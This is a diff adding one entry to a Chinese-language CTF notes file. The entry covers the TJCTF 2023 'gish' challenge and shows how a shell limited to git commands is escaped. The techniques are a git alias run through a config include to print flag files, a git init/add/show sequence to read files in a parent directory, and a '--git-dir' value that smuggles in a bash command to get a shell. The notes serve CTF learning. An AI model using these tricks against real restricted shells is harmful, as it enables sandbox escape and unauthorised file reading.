@@ -911,3 +911,35 @@ you can use the command show options to display the different configuration sett
   - `fls -o offset disk.raw <inode>`:查看disk在offset偏移处的inode文件（偏移从mml获得,inode可选）
   - `icat -o offset disk.raw inode > res.txt`:将disk在offset偏移处的inode文件内容导出到res.txt
 - 使用virtual box的命令vboximg-mount挂载虚拟disk：https://github.com/BYU-CSA/BYUCTF-2023/tree/main/vmception 。
+158. [gish](https://chocapikk.com/posts/2023/tjctf2023-gish/)
+- 当一个shell只能执行git相关命令时，仍然可以利用[git hooks](https://pilot34.medium.com/store-your-git-hooks-in-a-repository-2de1d319848c)执行任意命令。
+```sh
+git init //初始化一个git仓库
+git config --global user.email ""
+git config --global user.name "" //配置用户设置。配置后才能执行commit
+git config -f .gitconfig core.hooksPath hooks //告诉git使用配置在hooks目录下的文件作为hook
+git config --local alias.pre-commit '!echo $(cat /flag-*)' //设置一个alias pre-commit，其运行时会打印flag文件的内容
+git config --local include.path ../.gitconfig //加载刚才配置好的gitconfig
+git pre-commit //运行触发hook
+```
+- 不使用hook
+    - 任意文件读取
+    ```sh
+    git config --global user.email ""
+    git config --global user.name ""
+    git init .. //此题flag在上层目录，于是把仓库init到上层目录
+    git add ../flag* //添加flag文件
+    git commit -m 'a'
+    git show ../flag* //展示commit的文件，也就是flag
+    ```
+    - getshell。之后`cat /flag* >&2`获取flag
+    ```sh
+    git --git-dir '.;bash;' init
+    git init
+    git add .
+    git config --global user.email ''
+    git config --global user.name ''
+    git commit --allow-empty-message -m ''
+    git cache-meta --store
+    git cache-meta --apply
+    ```
